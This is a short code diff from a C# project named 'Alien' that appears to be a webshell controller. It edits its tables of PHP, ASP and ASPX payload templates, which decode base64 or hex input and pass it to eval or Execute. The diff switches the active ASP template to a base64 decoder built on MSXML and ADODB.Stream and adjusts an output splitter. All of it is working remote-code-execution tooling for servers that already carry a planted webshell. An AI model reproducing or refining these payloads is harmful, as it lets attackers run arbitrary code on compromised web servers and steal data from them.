@@ -68,8 +68,8 @@ namespace Alien
         private Dictionary<enLanguage, string> m_dicDecodeFunc = new Dictionary<enLanguage, string>()
         {
             { enLanguage.PHP, "@eval(base64_decode('[PATTERN]'));" },
-            { enLanguage.ASP, @"Execute(""Execute(""""On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Execute(""""""""On+Error+Resume+Next:""""""""%26bd(""""""""[PATTERN]"""""""")):Response.End"""")"")" },
-            //{ enLanguage.ASP, @"Execute(""On+Error+Resume+Next:Function+d(s):Set+x=CreateObject(""""MSXML2.DOMDocument""""):Set+e=x.createElement(""""t""""):e.dataType=""""bin.base64"""":e.text=s:Set+st=CreateObject(""""ADODB.Stream""""):st.Type=1:st.Open:st.Write+e.nodeTypedValue:st.Position=0:st.Type=2:st.CharSet=""""us-ascii"""":d=st.ReadText:End+Function:Execute(d(""""[PATTERN]"""")):Response.End"")" },
+            //{ enLanguage.ASP, @"Execute(""Execute(""""On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Execute(""""""""On+Error+Resume+Next:""""""""%26bd(""""""""[PATTERN]"""""""")):Response.End"""")"")" },
+            { enLanguage.ASP, @"Execute(""On+Error+Resume+Next:Function+d(s):Set+x=CreateObject(""""MSXML2.DOMDocument""""):Set+e=x.createElement(""""t""""):e.dataType=""""bin.base64"""":e.text=s:Set+st=CreateObject(""""ADODB.Stream""""):st.Type=1:st.Open:st.Write+e.nodeTypedValue:st.Position=0:st.Type=2:st.CharSet=""""utf-8"""":d=st.ReadText:End+Function:Execute(d(""""[PATTERN]"""")):Response.End"")" },
             { enLanguage.ASPX, @"var a0=Request.Item[""PATTERN""];var err:Exception;eval(System.Text.Encoding.GetEncoding(""UTF-8"").GetString(System.Convert.FromBase64String(a0)),""unsafe"");Response.End();" }
         };
 
@@ -79,7 +79,7 @@ namespace Alien
         private Dictionary<enLanguage, string> m_dicSplitter = new Dictionary<enLanguage, string>()
         {
             { enLanguage.PHP, "echo(\"[SPLITTER]\");" },
-            { enLanguage.ASP, "Response.Write(\"[SPLITTER]\");" },
+            { enLanguage.ASP, "Response.Write(\"[SPLITTER]\")" },
             { enLanguage.ASPX, "Response.Write(\"[SPLITTER]\");" }
         };
 
